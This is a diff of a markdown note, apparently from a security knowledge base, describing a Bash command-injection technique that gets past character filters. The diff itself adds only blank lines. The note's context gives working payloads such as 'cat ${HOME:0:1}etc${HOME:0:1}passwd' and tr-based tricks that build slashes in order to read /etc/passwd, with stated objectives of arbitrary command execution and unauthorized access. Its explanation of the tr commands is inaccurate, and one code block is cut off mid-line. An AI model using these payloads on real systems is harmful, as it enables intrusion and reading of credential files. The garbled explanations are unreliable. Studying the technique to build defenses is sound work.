@@ -36,9 +36,13 @@ Command injection is a type of attack where an attacker injects malicious code i
 
 Command injection is a type of attack where an attacker injects malicious code into a system command to execute arbitrary commands. In this case, the attacker is bypassing a filter on certain characters to execute arbitrary commands. This technique can be used by an attacker to gain unauthorized access to a system or to execute commands with elevated privileges. In Linux Bash, the attacker can bypass the filter by using alternative characters such as single or double quotes, backticks or parentheses. The attack can be executed without the use of backslashes and slashes.
 
+ 
+
 ## Requirements
 
 1. Access to a Linux Bash terminal
+
+ 
 
 ## Defense
 
@@ -48,22 +52,34 @@ Command injection is a type of attack where an attacker injects malicious code i
 
 1. Limit the privileges of the user executing the commands
 
+ 
+
 ## Objectives
 
 1. Execute arbitrary commands on the target system
 
 1. Gain unauthorized access to the system or execute commands with elevated privileges
 
+ 
+
 # Instructions
 
 1. Execute the following commands in a Linux Bash terminal:
+
+ 
+
+
 
 **Code**: [[swissky@crashlab:~$ echo ${HOME:0:1}
 /
 
 swissky@cr]]
 
+
+
 > The first command will display the root directory of the file system. The second command will display the contents of the /etc/passwd file. The third command replaces the exclamation mark with a double quote and the hyphen with a one. The fourth command uses the tr command to replace the exclamation mark with a double quote and the hyphen with a one. The fifth command will display the contents of the /etc/passwd file by using the cat command with the output of the third and fourth commands as arguments.
+
+
 
 **Command** ([[Echo HOME directory]]):
 
@@ -71,11 +87,19 @@ swissky@cr]]
 echo ${HOME:0:1}
 ```
 
+
+
+
+
 **Command** ([[Display contents of /etc/passwd file]]):
 
 ```bash
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 ```
+
+
+
+
 
 **Command** ([[Translate characters using tr command]]):
 
@@ -83,17 +107,27 @@ cat ${HOME:0:1}etc${HOME:0:1}passwd
 echo . | tr '!-0' '"-1'
 ```
 
+
+
+
+
 **Command** ([[Translate characters using tr command]]):
 
 ```bash
 tr '!-0' '"-1' <<< .
 ```
 
+
+
+
+
 **Command** ([[Display contents of /etc/passwd file]]):
 
 ```bash
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -122,3 +156,5 @@ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 - [[Bypass characters filter]]
 - [[Command Injection]]
 - [[Filter Bypasses]]
+
+
